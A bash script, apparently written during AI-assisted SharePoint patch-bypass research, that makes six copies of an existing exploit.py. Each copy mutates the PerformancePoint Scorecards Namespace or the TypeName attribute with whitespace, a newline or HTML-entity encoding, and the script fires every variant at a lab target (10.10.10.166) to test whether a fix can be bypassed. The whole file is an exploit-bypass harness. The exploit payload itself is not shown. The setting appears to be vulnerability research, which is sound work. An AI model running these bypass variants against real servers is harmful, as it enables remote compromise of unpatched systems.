#!/bin/bash
# Test various namespace/typename attribute manipulations

TARGET="http://10.10.10.166"
ORIGINAL_EXPLOIT="/mnt/d/temp/sp-toolshell-research-additional-files/3.2.diff-triage/additional_resources/exploits/exploit.py"
RESULTS_DIR="/mnt/d/temp/sp-toolshell-research-additional-files/3.2.diff-triage/ai_results"

echo "=== Testing Additional Bypass Variations ==="
echo ""

# Test 1: Leading space in namespace
echo "[Test 1] Leading space in namespace"
cp "$ORIGINAL_EXPLOIT" "$RESULTS_DIR/test_leading_space.py"
sed -i 's/Namespace="Microsoft.PerformancePoint.Scorecards"/Namespace=" Microsoft.PerformancePoint.Scorecards"/' "$RESULTS_DIR/test_leading_space.py"
diff "$ORIGINAL_EXPLOIT" "$RESULTS_DIR/test_leading_space.py" | grep "Namespace=" | head -2
python3 "$RESULTS_DIR/test_leading_space.py" --url "$TARGET" 2>&1 | grep -E "Status:|First.*bytes"
echo ""

# Test 2: Tab character in namespace
echo "[Test 2] Tab character after namespace"
cp "$ORIGINAL_EXPLOIT" "$RESULTS_DIR/test_tab.py"
sed -i 's/Namespace="Microsoft.PerformancePoint.Scorecards"/Namespace="Microsoft.PerformancePoint.Scorecards\t"/' "$RESULTS_DIR/test_tab.py"
diff "$ORIGINAL_EXPLOIT" "$RESULTS_DIR/test_tab.py" | grep "Namespace=" | head -2
python3 "$RESULTS_DIR/test_tab.py" --url "$TARGET" 2>&1 | grep -E "Status:|First.*bytes"
echo ""

# Test 3: Newline in namespace
echo "[Test 3] Newline in namespace"
cp "$ORIGINAL_EXPLOIT" "$RESULTS_DIR/test_newline.py"
sed -i 's/Namespace="Microsoft.PerformancePoint.Scorecards"/Namespace="Microsoft.PerformancePoint.Scorecards\n"/' "$RESULTS_DIR/test_newline.py"
python3 "$RESULTS_DIR/test_newline.py" --url "$TARGET" 2>&1 | grep -E "Status:|First.*bytes"
echo ""

# Test 4: Multiple trailing spaces
echo "[Test 4] Multiple trailing spaces"
cp "$ORIGINAL_EXPLOIT" "$RESULTS_DIR/test_multi_space.py"
sed -i 's/Namespace="Microsoft.PerformancePoint.Scorecards"/Namespace="Microsoft.PerformancePoint.Scorecards  "/' "$RESULTS_DIR/test_multi_space.py"
python3 "$RESULTS_DIR/test_multi_space.py" --url "$TARGET" 2>&1 | grep -E "Status:|First.*bytes"
echo ""

# Test 5: Trailing space in TypeName (different attribute)
echo "[Test 5] Trailing space in TypeName attribute instead"
cp "$ORIGINAL_EXPLOIT" "$RESULTS_DIR/test_typename_space.py"
sed -i 's/<ScorecardClient:ExcelDataSet/<ScorecardClient:ExcelDataSet /' "$RESULTS_DIR/test_typename_space.py"
python3 "$RESULTS_DIR/test_typename_space.py" --url "$TARGET" 2>&1 | grep -E "Status:|First.*bytes"
echo ""

# Test 6: HTML entity encoding (CVE-2021-28474 pattern)
echo "[Test 6] HTML entity encoding of namespace"
cp "$ORIGINAL_EXPLOIT" "$RESULTS_DIR/test_html_entity.py"
# Replace 'S' with &#83; in namespace
sed -i 's/Namespace="Microsoft.PerformancePoint.Scorecards"/Namespace="Microsoft.PerformancePoint.&#83;corecards"/' "$RESULTS_DIR/test_html_entity.py"
python3 "$RESULTS_DIR/test_html_entity.py" --url "$TARGET" 2>&1 | grep -E "Status:|First.*bytes"
echo ""

echo "=== Test Series Complete ==="
